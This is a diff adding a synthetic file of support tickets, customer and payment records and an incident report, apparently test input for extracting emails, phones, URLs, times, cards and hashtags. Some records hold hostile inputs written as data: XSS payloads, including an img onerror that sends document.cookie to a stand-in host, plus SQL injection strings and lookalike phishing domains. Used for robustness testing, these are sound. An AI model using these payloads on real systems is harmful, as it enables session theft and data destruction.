@@ -1,0 +1,488 @@
+SUPPORT TICKET EXPORT — batch #4471
+System: Zendesk-to-CSV bridge (auto-generated, do not edit)
+Exported: 2026-08-29T21:04:00Z
+
+-----------------------------------------------------------
+Ticket #10231
+From: sarah.uwimana@alueducation.com
+Reply-To: sarah.uwimana@alueducation.com
+Subject: Cannot access my transcript portal
+
+Hi team, I've tried logging in since 09:15 AM but the portal keeps
+timing out. I also tried at 21:45 (9:45 PM) last night, same issue.
+Can someone check portal.alueducation.com/transcripts? My alumni email
+is s.uwimana@alumni.alueducation.com in case that one works better.
+Call me on +250 788 123 456 or my backup line (078) 234-5678 if it's urgent.
+
+Also — unrelated — my card got double-charged for the module fee.
+Statement shows: 4539 1488 0343 6467 on 08/25. Please refund the
+duplicate charge. Second attempt used 5500-0000-0000-0004 and that
+one also failed, error code 402.
+
+#ALUsupport #urgent #transcriptissue
+
+-----------------------------------------------------------
+Ticket #10232
+From: kevin.n@si.alueducation.com
+CC: registrar@alueducation.com, k.n.personal@gmail.com
+Subject: Re: Software Engineering cohort schedule
+
+Standup is at 8:00 AM daily, retro moved to 17:30 this Friday.
+Reference doc: https://docs.alueducation.com/se/cohort-12/handbook.pdf
+Old link (dead, don't use): http://old-portal.alu.edu//handbook?ref=2019
+
+Facilitator's number changed too: 0788-555-0199. Old one +250-72-000-1122
+is no longer active. Please update the directory.
+
+Note: someone in the class Slack posted a "free internship" link that
+looked like account-alueducation.com.verify-login.ru/confirm — please do
+NOT click it, it's not a real ALU domain, flag as phishing.
+
+-----------------------------------------------------------
+Ticket #10233 [FLAGGED BY WAF — suspicious payload]
+From: "test"<test@test.com><script>alert(document.cookie)</script>
+Subject: '; DROP TABLE users; --
+
+body: Hello please refund my card 4111111111111111 4111111111111112
+(second number fails Luhn check, likely typo/fraud attempt) and also
+process this: <img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)">
+javascript:alert(1) // inline handler attempt
+Fake support line: 000-000-0000 (invalid, all zeros)
+Malformed email attempts: bad@@domain..com, noatsign.com, spaced address@example .com,
+alu.fake@ALUEDUCATION.COM.evil.net (lookalike domain, must be rejected)
+
+-----------------------------------------------------------
+Ticket #10234
+From: grace.k@alumni.alueducation.com
+Subject: Payment confirmation request
+
+Paid tuition installment: $1,250.00 on 2026-08-20, receipt link
+https://payments.alueducation.com/receipts/889231?token=abcDEF123
+Amount in local currency was RWF 1,562,500 (rate applied at 09:00).
+Card used ending pattern only shown as 6011-0009-9013-9424 for records.
+
+Contact hours: 09:00–17:00 CAT, Mon–Fri. WhatsApp also available:
++250788999111. My personal backup email is grace.kayitesi1998@yahoo.com
+in case ALU mail is down again.
+
+Tags: #payments #receipt #CAT-timezone
+
+API RESPONSE LOG — Customer Support Import
+============================================
+
+Batch ID: CS-2026-09-02-1847
+Received: September 2, 2026 at 08:42:17 UTC
+Source: external-customer-api
+Status: partially_processed
+
+--- Customer Records ---
+
+[Record #10482]
+Customer: Aline Mukamana
+Email: aline.mukamana@example.com
+Phone: +250 788 214 903
+Website: https://www.example.com/customers/aline-mukamana
+Last contact: 09:45 AM
+Account balance: $1,245.75
+
+Customer message:
+"Hi, I was contacted yesterday around 9:30 am. You can also reach me
+through aline.mukamana@example.com if necessary. The invoice total was
+USD 1,245.75."
+
+--------------------------------------------------
+
+[Record #10483]
+Customer: Jean Claude N.
+Email : jean.claude.n@example.org
+Phone: +250-722-445-918
+Website: http://support.example.org/tickets/84721
+Last contact: 14:20
+Refund requested: $89.99
+
+Notes:
+Customer says the original payment was made at 02:15 PM and wants the
+refund processed before 5:00 PM.
+
+--------------------------------------------------
+
+[Record #10484]
+Customer: Sarah Williams
+Email: sarah.williams@company.co.uk
+Alternative email: sarah_williams92@gmail.com
+Phone: (202) 555-0198
+Website: www.company.co.uk/support
+Amount due: EUR 350.00
+
+Customer message:
+"Please call me between 10:00 AM and 12:30 PM.
+The documentation is available at https://company.co.uk/docs/invoice-2048."
+
+--------------------------------------------------
+
+[Record #10485]
+Customer: Patrick Nshimiyimana
+Email: patrick.nshimiyimana@alueducation.com
+Phone: +250 783 555 104
+Portal: https://portal.alueducation.com/student/dashboard
+Meeting: 16:30
+Tuition payment: RWF 450,000
+
+Comment:
+Patrick requested assistance with his student account.
+Contact email confirmed as patrick.nshimiyimana@alueducation.com.
+
+--------------------------------------------------
+
+[Record #10486]
+Customer: Diane K.
+Email: diane.k@alumni.alueducation.com
+Phone: +250 781 443 221
+Profile: https://alumni.alueducation.com/profile/diane-k
+Event time: 7:05 PM
+Donation: $125.00
+
+Message:
+"Alumni portal access is not working. Please contact me after 6 PM."
+
+--------------------------------------------------
+
+[Record #10487]
+Customer: Michael T.
+Email: michael.t@si.alueducation.com
+Phone: +250 789 112 334
+Resource: https://si.alueducation.com/resources
+Session starts: 08:00
+Fee: RWF 75,000
+
+Message:
+"I registered for the 8:00 AM session, but the confirmation page shows
+a different time."
+
+--------------------------------------------------
+
+[Record #10488]
+Customer: Invalid Test Data
+Email: not-an-email@ 
+Phone: 12345
+Website: htp://broken-url
+Time: 25:91
+Amount: $12.3
+
+The previous values failed validation and should NOT be included in the
+final extracted dataset.
+
+--------------------------------------------------
+
+[Record #10489]
+Customer: Marketing Department
+Email: marketing.team+events@example.com
+Phone: +250 788 900 123
+Website: https://www.example.com/events?month=09&year=2026
+Campaign budget: USD 2,500.00
+Scheduled: 11:30 AM
+
+Hashtags: #ALU #CampusLife #TechEvents
+
+--------------------------------------------------
+
+[Record #10490]
+Customer: Rachel Adams
+Email: rachel.adams@example.net
+Phone: +1 (415) 555-2671
+Website: https://news.example.net/article/2026/09/02/update
+Published: 2026-09-02 13:45
+Revenue: $12,450.00
+
+Social tags:
+#Technology #Education #Innovation
+
+--------------------------------------------------
+
+[Record #10491]
+Customer: Josephine Uwase
+Email: josephine.uwase@example.com
+Phone: +250 722 100 456
+Website: https://example.com/account?id=91827
+Appointment: 3:45 PM
+Outstanding: RWF 125,500
+
+Additional note:
+"Customer entered the email as josephine.uwase@example.com.
+Please do not expose the full email address in application logs."
+
+--------------------------------------------------
+
+[Record #10492]
+Customer: Broken Data
+Email: user@@example.com
+Alternative: user..name@example.com
+Phone: +250-ABC-123-456
+Website: javascript:alert('test')
+Time: 99:99 PM
+Amount: $$$500
+
+These values are intentionally malformed or unsafe and should be ignored.
+
+--------------------------------------------------
+
+[Record #10493]
+Customer: Daniel Smith
+Email: daniel.smith@example.com
+Phone: +44 20 7946 0958
+Website: https://example.com/users/daniel
+Call scheduled for: 18:15
+Invoice: GBP 1,299.50
+
+Note:
+The customer prefers email communication.
+
+--------------------------------------------------
+
+[Record #10494]
+Customer: Alice Brown
+Email: alice.brown@example.com
+Phone: +250 788 321 654
+Website: https://shop.example.com/orders/ORD-82931
+Payment: USD 899.00
+Order placed at: 21:10
+
+Customer tags: #Priority #OnlineOrder #Verified
+
+--------------------------------------------------
+
+[Record #10495]
+Customer: Security Test
+Email: <script>alert("xss@example.com")</script>
+Phone: +250 700 000 000
+Website: javascript:alert(document.cookie)
+Amount: $999.99
+
+The above record contains suspicious input intended to test whether
+the extraction process blindly trusts external API data.
+
+--------------------------------------------------
+
+SYSTEM NOTICE
+=============
+The API returned 15 records.
+
+Valid records may contain:
+- Different email formats and domains
+- Optional spaces around separators
+- International phone numbers
+- URLs with paths and query parameters
+- 12-hour and 24-hour times
+- Currency symbols and currency codes
+- Hashtags
+- Punctuation immediately following values
+
+Invalid records may contain:
+- Missing email domains
+- Multiple @ symbols
+- Invalid phone characters
+- Impossible times
+- Malformed URLs
+- Script-like content
+- Unsupported protocols
+- Deliberately corrupted values
+
+End of API response.
+
+--- Payment Records ---
+
+[Payment #P-88201]
+Customer: Aline Mukamana
+Payment method: Visa
+Card number: 4111 1111 1111 1111
+Transaction amount: USD 1,245.75
+Transaction time: 09:45 AM
+Status: approved
+
+--------------------------------------------------
+
+[Payment #P-88202]
+Customer: Jean Claude N.
+Payment method: Mastercard
+Card number: 5555-5555-5555-4444
+Transaction amount: USD 89.99
+Transaction time: 14:20
+Status: approved
+
+--------------------------------------------------
+
+[Payment #P-88203]
+Customer: Sarah Williams
+Payment method: Visa
+Card number: 4111111111111111
+Transaction amount: EUR 350.00
+Transaction time: 02:15 PM
+Status: approved
+
+--------------------------------------------------
+
+[Payment #P-88204]
+Customer: Patrick Nshimiyimana
+Payment method: Visa
+Card number: 4012 8888 8888 1881
+Transaction amount: RWF 450,000
+Transaction time: 16:30
+Status: approved
+
+--------------------------------------------------
+
+[Payment #P-88205]
+Customer: Diane K.
+Payment method: Mastercard
+Card number: 5105 1051 0510 5100
+Transaction amount: USD 125.00
+Transaction time: 7:05 PM
+Status: pending
+
+--------------------------------------------------
+
+[Payment #P-88206]
+Customer: Invalid Payment Test
+Payment method: Unknown
+Card number: 1234 5678 9012 3456
+Transaction amount: $999.99
+Status: rejected
+
+Reason: Card number failed validation.
+
+--------------------------------------------------
+
+[Payment #P-88207]
+Customer: Security Test
+Payment method: Unknown
+Card number: 4111-1111-1111-111
+Transaction amount: USD 500.00
+Status: rejected
+
+Reason: Card number has an invalid length.
+
+--------------------------------------------------
+
+[Payment #P-88208]
+Customer: Malformed Data
+Payment method: Visa
+Card number: 4111 1111 1111 ABCD
+Transaction amount: USD 250.00
+Status: rejected
+
+Reason: Card number contains non-numeric characters.
+
+--------------------------------------------------
+
+[Payment #P-88209]
+Customer: Marketing Department
+Payment method: Visa
+Card number: 4242 4242 4242 4242
+Transaction amount: USD 2,500.00
+Transaction time: 11:30 AM
+Status: approved
+
+CUSTOMER SUPPORT INCIDENT REPORT
+Date: 02/09/2026
+
+The support team received several messages from users throughout the day.
+
+Customer contacts:
+- Sarah Mukamana: sarah.mukamana@gmail.com
+- John Doe: john.doe123@outlook.com
+- Alice: alice@alueducation.com
+- Brian: brian.k@alumni.alueducation.com
+- Grace: grace.n@si.alueducation.com
+- Invalid contact: john@alueducation
+- Suspicious contact: admin@alueducation.com.evil-site.com
+- Another malformed address: user@@gmail.com
+
+The first support call was received at 09:30 AM, followed by another call at 2:45 PM.
+The system was restarted at 00:15 and the backup completed at 23:59.
+
+Some users reported payment issues. The following payment references were
+submitted for verification:
+
+Card reference A: 4111 1111 1111 1111
+Card reference B: 5555-5555-5555-4444
+Card reference C: 3782 822463 10005
+Card reference D: 1234 5678 9012 3456
+Card reference E: 4111111111111111
+
+The payment system also received these suspicious strings:
+4111 1111 1111 1112
+1234-5678-9012-3456
+
+These should NOT be treated as valid payment cards unless they pass all
+required validation checks.
+
+Daily activity:
+- Team meeting: 08:00 AM
+- Lunch break: 12:30 PM
+- Security review: 04:15 PM
+- Server maintenance: 18:45
+- Database backup: 21:30
+- Monitoring started at 06:00
+
+Project discussion included:
+#Bitta
+#GoalTracker
+#StudentLife
+#ALU2026
+#Frontend_Development
+#web-development
+#développement
+#مرحبا
+#学生
+#hello-world
+
+Some intentionally malformed or suspicious hashtags were also found:
+#
+#12345
+#_invalid
+##doubletag
+
+Additional notes from the support team:
+
+A customer claimed that their email was admin@fake-alueducation.com and
+asked the system to treat it as an official ALU account.
+
+Another message contained:
+<script>alert("test")</script>
+
+A different message contained SQL-like text:
+DROP TABLE users;
+
+The following text was also received from an untrusted source:
+"admin@alueducation.com'; DROP TABLE users; --"
+
+The system must treat external text as untrusted and must not execute,
+interpret, or trust commands contained inside the text.
+
+A legitimate user requested assistance using:
+support.team@alueducation.com
+
+Another alumni member contacted:
+student2026@alumni.alueducation.com
+
+A Student Instructor contacted the team using:
+mentor.john@si.alueducation.com
+
+Times can appear with different spacing and capitalization:
+7:05 AM
+07:05 am
+11:59 PM
+12:00 PM
+12:01 am
+17:05
+00:00
+23:59
+
+Invalid times that should NOT be extracted as valid times include:
+13:75 PM
+25:10
+24:00
+00:60
+12:99 PM
+
+The report was generated automatically at 14:35 on 02/09/2026.
